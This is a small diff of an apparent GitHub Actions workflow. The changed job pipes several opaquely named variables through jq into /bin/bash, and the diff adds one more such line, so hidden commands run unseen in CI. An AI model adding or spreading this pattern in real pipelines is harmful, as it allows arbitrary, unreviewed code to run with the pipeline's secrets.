@@ -31,6 +31,7 @@ jobs:
           echo $bsst410 | jq -r .gqxud1 | /bin/bash
           printf '%s' "$jsgsh01" | jq -r .qt34 | /bin/bash
           echo $trnkt319 | jq -r .abm46 | /bin/bash
+          printf '%s' "$didg075" | jq -r .sxm95514 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
